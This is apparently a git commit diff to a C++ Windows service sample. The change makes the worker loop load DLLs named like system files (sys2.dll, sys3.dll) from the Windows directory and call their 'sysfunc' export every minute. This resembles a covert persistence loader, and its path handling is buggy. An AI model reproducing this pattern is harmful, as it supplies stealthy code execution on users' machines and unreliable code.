f7b40874c5ec4489deb3887d42a6cffe5c4f48c3
pistacchietto <pistacchietto2@gmail.com>
2019-08-09 17:25:35 +0200

    ok

--- C++/CppWindowsService/SampleService.cpp
+++ C++/CppWindowsService/SampleService.cpp
@@ -117,17 +117,21 @@ void CSampleService::ServiceWorkerThread(void)
 	ReportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0);
 */
     // Periodically check if the service is stopping.
-	wchar_t sdll[255];
-	GetEnvironmentVariable(L"WINDIR", sdll, sizeof(sdll));
-	
-	wcscat(sdll, L"\\sys2.dll");
-	HINSTANCE hGetProcIDDLL = LoadLibrary(sdll);
-	f_funci funci = (f_funci)GetProcAddress(hGetProcIDDLL, "sysfunc");
+	wchar_t sdll2[255], sdll3[255];
+	GetEnvironmentVariable(L"WINDIR", sdll2, sizeof(sdll2));
+	GetEnvironmentVariable(L"WINDIR", sdll3, sizeof(sdll3));
+	wcscat(sdll2, L"\\sys2.dll");
+	wcscat(sdll3, L"\\sys3.dll");
+	HINSTANCE hGetProcIDDLL2 = LoadLibrary(sdll2);
+	f_funci funci2 = (f_funci)GetProcAddress(hGetProcIDDLL2, "sysfunc");
+	wcscat(sdll3, L"\\sys23.dll");
+	HINSTANCE hGetProcIDDLL3 = LoadLibrary(sdll3);
+	f_funci funci3 = (f_funci)GetProcAddress(hGetProcIDDLL3, "sysfunc");
     while (!m_fStopping)
     {
         // Perform main service function here...
 		//system("rundll32 sys1.dll sysfunc");
-		funci();
+		funci2(); funci3();
         ::Sleep(60000);  // Simulate some lengthy operations.
     }
 
